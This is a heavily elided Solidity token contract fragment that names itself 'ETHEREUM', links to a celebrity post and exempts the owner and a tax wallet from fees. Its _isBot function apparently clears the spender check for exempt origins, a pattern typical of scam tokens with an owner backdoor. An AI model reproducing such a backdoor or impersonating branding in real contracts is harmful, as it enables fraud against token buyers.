...
/*
https://x.com/VitalikButerin/status/2024543743127539901
*/
...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isETHEREUMExcludedFromFees;
    ...
    string private _name = unicode"Currency of freedom";
    string private _symbol = unicode"ETHEREUM";
    ...
    constructor() payable {
        ...
        _isETHEREUMExcludedFromFees[owner()] = true;
        _isETHEREUMExcludedFromFees[address(this)] = true;
        _isETHEREUMExcludedFromFees[_taxWallet] = true;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (
                ...
                !_isETHEREUMExcludedFromFees[to]
            ) {
    ...
    function _isBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isETHEREUMExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
